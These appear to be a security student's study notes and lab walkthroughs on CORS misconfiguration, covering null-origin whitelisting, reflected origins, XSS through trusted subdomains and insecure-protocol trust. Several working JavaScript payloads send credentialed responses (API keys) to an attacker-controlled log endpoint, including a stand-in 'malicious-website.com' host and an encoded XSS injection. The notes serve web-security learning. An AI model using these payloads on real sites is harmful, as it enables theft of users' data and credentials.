@@ -1,0 +1,160 @@
+Cheat sheet: https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet
+
+Same-origin policy (SOP):
+- Restrictive cross-origin specification that limits the ability for a website to interact with resources outside of the source domain
+- It generally allows a domain to issue requests to other domains, but not to access the responses.
+
+Access-Control-Allow-Origin (ACAO) response header:
+- This header include in response from 1 web to a request originating from another web, identify the permitted origin of request
+- Compare ACAO with request website's origin and permit access if they match
+- Access-Control-Allow-Origin: allow other web request and read the response because origin match
+- Access-Control-Allow-Credentials: permit to send request with cookie, authorizationin cross-origin request, default = false
+- Some case: 
++ When ACAO is * wildcard and ACAC is true (not allow)
++ When ACAO is specific origin and ACAC is true (allow)
+
+Pre-flight checks:
+- When cross domain request non standard method or headers, preceded by OPTIONS method, CORS check on what method and header are permitted to allow cross-origin request
+
+Does CORS protect against CSRF:
+- It's not provide protection against CSRF attack, this is common misconception
+- CORS is controlled relaxation of same-origin policy
+- Poorly configured CORS may increase possibility of csrf attack or exacerbate their impact.
+
+Vulnerabilities arising from CORS configuration issues:
+- Many modern web use CORS to allow access from subdomains and trusted third parties
+- Their implementation of CORS may contain mistake or be overly lenient to ensure everything work, can result in exploitable vuln
+
+Server-generated ACAO header from client-specified Origin header
+- Many web need to provide access to other domains, maintaining list of allowed domains requires ongoing effort, so they take easy route, allow access from any other domain
+- Way to check is to add 'Origin: http://attacker-web.com'
+    + If response contain ACAO that allow request, website is allow access from any other domain
+    + If it contain ACAC, cross-origin can include coookie
+    + If response contain any sensitive data such as api key or csrf token, you could retrieve them
+
+Errors parsing Origin headers:
+- Some applications support multiple origin by using a whitelist of allowed origin
+    + When CORS request is received, it compare to whitelist, if it allowed, will reflect in response header
+- Some organizes also allow from all their subdomains and other organizations with their subdomains
+    + Implemented by matching URL prefixes or suffixes, or using regular expressions
+
+Whitelisted null origin value:
+- The specification for the Origin header supports the value null, browser use it in various unusual situations:
+    + Cross-origin redirects.
+    + Requests from serialized data.
+    + Requests from serialized data.
+    + Sandboxed cross-origin requests.
+    + Sometimes whitelist null to support local development
+- In this case, attacker can use various trick to generate a cross-origin request contain origin null
+    + It can be done by using a sandbox iframe cross-origin request
+        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+        var req = new XMLHttpRequest();
+        req.onload = reqListener;
+        req.open('get','vulnerable-website.com/sensitive-victim-data',true);
+        req.withCredentials = true;
+        req.send();
+
+        function reqListener() {
+        location='malicious-website.com/log?key='+this.responseText;
+        };
+        </script>"></iframe>
+    + Core Principle: browser using origin null for any request intentionally hides or cannot identify.
+    + Origin is define by scheme + domain + port, if missing one of these, origin will set to null
+        Example: data:text/html,<script>...</script>, file:///home/user/test.html
+            // Create iframe with data: URL
+            const iframe = document.createElement('iframe');
+            iframe.src = `data:text/html,
+            <script>
+            var req = new XMLHttpRequest();
+            req.open('get', 'https://httpbin.org/headers', true);
+            req.onload = function() { console.log(this.responseText); };
+            req.send();
+            </script>`;
+            document.body.appendChild(iframe);
+
+Exploiting XSS via CORS trust relationships:
+- Even if CORS is config correctly, if trust relationship between 2 origin
+    + If website being trusted is vuln to XSS, attacker can exploit XSS inject from web is trusted
+    + https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
+
+Breaking TLS with poorly configured CORS:
+- Suppose an application HTTPS whitelists a trusted subdomain that is using plain HTTP.
+- Attacking step:
+    + The victim user makes any plain HTTP request.
+    + The attacker injects a redirection to HTTP domain
+    + The victim's browser follows the redirect.
+    + The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to HTTPS
+    + The victim's browser makes the CORS request, including the origin HTTP
+    + The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
+    + The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
+
+Intranets and CORS without credentials:
+- Most CORS attack rely on response header
+- 1 common situation where an attacker can't access a website directly
+    + When it's part of an organization's intranet, and located within private IP address space
+    + Internal websites are often held to a lower security standard than external sites, enabling attackers to find vulnerabilities and gain further access.
+    Example: 
+        GET /reader?url=doc1.pdf
+        Host: intranet.normal-website.com
+        Origin: https://normal-website.com
+
+        HTTP/1.1 200 OK
+        Access-Control-Allow-Origin: *
+    + Server is trusting resource requests from any origin without credentials
+    + If users within the private IP address space access the public internet then a CORS-based attack can be performed from the external site that uses the victim's browser as a proxy for accessing intranet resources.
+
+How to prevent CORS-based attacks:
+- Proper configuration of cross-origin requests
+- Only allow trusted sites
+- Avoid whitelisting null
+- Avoid wildcards in internal networks
+- CORS is not a substitute for server-side security policies
+
+
+01_CORS_vulnerability_with_basic_origin_reflection
+- Check in http request, you can see /accountDetails path 
+    + Contain sensitive data about user, include API key
+    + Also in that response ACAC is set to true
+- Try to add 'Origin: http://normal-web.com'
+    + In response, the ACAO allow any origin you add 
+- So now, you can send victim payload to retrieve sensitive data
+        <script>
+            var req = new XMLHttpRequest();
+            req.onload = reqListener;
+            req.open('get','{url}/accountDetails',true);
+            req.withCredentials = true;
+            req.send();
+            function reqListener() {{ location='/log?key='+this.responseText; }};
+        </script>
+
+02_CORS_vulnerability_with_trusted_null_origin
+- In this lab, like description, it vuln to origin: null
+    + You can check it by adding origin: null in request, response reflect ACAO
+- So just like previous lab, use payload but make origin null to retrieve sensitive data
+        <iframe sandbox="allow-scripts allow-top-navigation allow-forms" 
+            srcdoc="
+            <script>
+                var req = new XMLHttpRequest();
+                req.onload = reqListener;
+                req.open('get','{url}/accountDetails',true);
+                req.withCredentials = true;
+                req.send();
+                function reqListener() {{
+                    location='/log?key='+this.responseText;
+                }};
+            </script>">
+        </iframe>
+
+03_CORS_vulnerability_with_trusted_insecure_protocols
+- In this lab, we have a trusted origin named http://stock.{url}/?productId=1&storeId=1
+    + You can go to product, click check stock and see it
+    + Also this contain vuln XSS in productId param, test with <script>alert(1)</script> and you will see pop up
+- You can use this payload to following breaking tls step above
+    <script>
+        document.location = "http://stock.{url.split('://')[1]}/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','{url}/accountDetails',true); req.withCredentials = true; req.send(); function reqListener() {{ location='{exploit_url}/log?key='%2bthis.responseText; }};%3C/script>&storeId=1"
+    </script>
+- Note:
+    + Must encode + -> %2b, because if you have + in url, after decode it become space
+        Example: hello+world -> hello world
+                 hello%2bworld -> hello+world
+    + Must encode: < -> %3c, because if you keep </script>, browser will think that this payload is ended at that position
